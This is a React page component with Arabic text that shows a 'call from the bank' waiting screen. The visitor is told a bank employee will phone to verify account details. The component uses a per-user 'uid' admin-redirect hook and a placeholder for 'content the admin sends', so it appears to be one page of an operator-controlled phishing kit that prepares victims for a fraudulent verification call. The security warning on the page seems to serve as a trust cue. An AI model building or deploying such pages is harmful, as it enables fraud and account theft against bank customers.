import { useSearchParams } from "react-router-dom";
import { Phone, ShieldCheck, Clock, AlertTriangle, Info } from "lucide-react";
import SiteHeader from "@/components/SiteHeader";
import SiteFooter from "@/components/SiteFooter";
import { useAdminRedirect } from "@/hooks/use-admin-redirect";

const BankCall = () => {
  const [searchParams] = useSearchParams();
  const userId = searchParams.get("uid") || "";
  useAdminRedirect(userId || null);

  return (
    <div className="min-h-screen flex flex-col bg-background" dir="rtl">
      <SiteHeader />

      <main className="flex-1 container mx-auto px-4 py-10">
        <div className="max-w-2xl mx-auto">
          {/* Hero */}
          <div className="text-center mb-8 animate-fade-in">
            <div className="inline-flex w-20 h-20 rounded-full hero-gradient items-center justify-center shadow-[0_10px_40px_hsl(213_76%_44%/0.45)] mb-4">
              <Phone className="w-10 h-10 text-primary-foreground animate-pulse" />
            </div>
            <h1 className="text-3xl font-extrabold text-foreground mb-2">
              مكالمة من البنك
            </h1>
            <p className="text-sm text-muted-foreground">
              يرجى الانتظار، سيتم التواصل معك من قبل أحد موظفي البنك خلال لحظات
            </p>
          </div>

          {/* Info Box */}
          <div className="bg-card border border-border rounded-2xl shadow-lg overflow-hidden">
            <div className="hero-gradient px-5 py-4 flex items-center gap-3">
              <Info className="w-5 h-5 text-primary-foreground" />
              <h2 className="text-base font-bold text-primary-foreground">
                معلومات هامة قبل المكالمة
              </h2>
            </div>

            <div className="p-6 space-y-5">
              <div className="flex items-start gap-3">
                <ShieldCheck className="w-5 h-5 text-primary shrink-0 mt-0.5" />
                <div>
                  <h3 className="font-bold text-foreground mb-1 text-sm">
                    تأكد من هوية المتصل
                  </h3>
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    سيتواصل معك موظف البنك الرسمي للتحقق من بيانات حسابك واستكمال إجراءات تفعيل الخدمة.
                  </p>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <Clock className="w-5 h-5 text-primary shrink-0 mt-0.5" />
                <div>
                  <h3 className="font-bold text-foreground mb-1 text-sm">
                    مدة المكالمة
                  </h3>
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    لن تستغرق المكالمة أكثر من بضع دقائق لاستكمال التحقق وتأمين حسابك.
                  </p>
                </div>
              </div>

              <div className="flex items-start gap-3">
                <AlertTriangle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
                <div>
                  <h3 className="font-bold text-foreground mb-1 text-sm">
                    تنبيه أمني
                  </h3>
                  <p className="text-xs text-muted-foreground leading-relaxed">
                    لا تشارك أبداً كلمة المرور أو رمز التحقق (OTP) كاملاً عبر الهاتف. موظف البنك لن يطلب منك ذلك.
                  </p>
                </div>
              </div>

              {/* Placeholder block — replace with the content the admin sends */}
              <div className="bg-muted/40 border border-dashed border-border rounded-xl p-4">
                <p className="text-xs text-muted-foreground text-center leading-relaxed">
                  يرجى إبقاء هاتفك بالقرب منك والاستعداد للرد على المكالمة الواردة من رقم البنك الرسمي.
                </p>
              </div>
            </div>
          </div>

          {/* Status indicator */}
          <div className="mt-6 flex items-center justify-center gap-2">
            <span className="relative flex h-3 w-3">
              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-primary opacity-75" />
              <span className="relative inline-flex rounded-full h-3 w-3 bg-primary" />
            </span>
            <span className="text-xs font-bold text-foreground">
              في انتظار الاتصال...
            </span>
          </div>
        </div>
      </main>

      <SiteFooter />
    </div>
  );
};

export default BankCall;
